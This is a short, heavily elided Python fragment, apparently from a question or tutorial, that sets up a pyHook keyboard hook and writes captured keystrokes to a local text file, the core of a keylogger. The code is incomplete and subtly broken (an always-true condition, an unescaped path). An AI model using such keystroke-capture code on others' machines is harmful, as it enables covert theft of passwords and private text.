...
def OnKeyboardEvent(event):
	...
	if event.Ascii !=0 or 8:
		...
		f = open('c:\output.text', 'r+') #<---Open the path file as a text file and input the keyboard text
...
hm = pyHook.HookManager() #<---Referencing the class library that was implemntation
